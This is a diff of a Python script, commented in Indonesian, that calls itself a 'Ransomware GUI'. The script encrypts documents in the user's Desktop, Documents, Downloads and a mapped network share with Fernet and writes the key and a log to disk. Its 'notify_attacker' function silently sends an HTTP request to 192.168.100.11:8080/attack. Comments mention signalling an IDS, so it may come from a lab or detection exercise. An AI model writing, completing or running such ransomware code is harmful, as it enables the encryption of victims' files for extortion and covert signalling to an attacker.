@@ -4,35 +4,37 @@ from tkinter import messagebox
 from cryptography.fernet import Fernet
 import requests
 
-# Daftar target direktori termasuk Shared Folder Windows
+# Path untuk simpan key dan log (disimpan di folder yang dijamin ada di Windows)
+USER_FOLDER = os.path.join(os.environ['USERPROFILE'], 'Documents')  # Aman di Windows
+
+KEY_PATH = os.path.join(USER_FOLDER, "ransom_key.key")
+LOG_PATH = os.path.join(USER_FOLDER, "ransom_log.txt")
+
+# Target direktori yang ingin dienkripsi (pastikan Z: aktif)
 TARGET_DIRS = [
     os.path.expanduser("~/Desktop"),
     os.path.expanduser("~/Documents"),
     os.path.expanduser("~/Downloads"),
-    os.path.expanduser("~/vmshare")
+    "Z:\\vmshare"
 ]
 
-# File ekstensi yang akan diproses
+# Ekstensi file yang akan diproses
 EXTENSIONS = ['.pdf', '.docx', '.xlsx', '.txt', '.pptx']
 
-# Path penyimpanan kunci & log
-KEY_PATH = os.path.expanduser("~/ransom_key.key")
-LOG_PATH = os.path.expanduser("~/ransom_log.txt")
-
-# Fungsi enkripsi
+# Fungsi untuk membuat kunci
 def generate_key():
     key = Fernet.generate_key()
     with open(KEY_PATH, "wb") as f:
         f.write(key)
     return key
 
+# Fungsi untuk mengenkripsi file
 def encrypt_file(file_path, fernet, log_file):
     try:
         with open(file_path, "rb") as file:
             original = file.read()
         encrypted = fernet.encrypt(original)
 
-        # Rename file menjadi .enc
         new_path = file_path + ".enc"
 
         with open(new_path, "wb") as file:
@@ -43,18 +45,19 @@ def encrypt_file(file_path, fernet, log_file):
     except Exception as e:
         log_file.write(f"Gagal: {file_path} | {e}\n")
 
-# Fungsi trigger IDS lewat koneksi HTTP (jika perlu)
+# Fungsi untuk mengirim sinyal ke IDS (opsional)
 def notify_attacker():
     try:
         requests.get("http://192.168.100.11:8080/attack", timeout=1)
     except:
-        pass  # Jangan munculkan error agar tetap silent
+        pass  # Supaya silent
 
+# Fungsi utama enkripsi
 def encrypt_all():
     key = generate_key()
     fernet = Fernet(key)
 
-    with open(LOG_PATH, "w") as log_file:
+    with open(LOG_PATH, "w", encoding="utf-8") as log_file:
         log_file.write("Log Enkripsi - Ransomware GUI\n")
         log_file.write("="*40 + "\n")
 
@@ -70,7 +73,7 @@ def encrypt_all():
                         encrypt_file(full_path, fernet, log_file)
 
     notify_attacker()
-    messagebox.showinfo("Selesai", "File berhasil dienkripsi!\nLihat log di Desktop Anda.")
+    messagebox.showinfo("Selesai", f"File berhasil dienkripsi!\nLog ada di:\n{LOG_PATH}")
 
 # GUI
 def launch_gui():
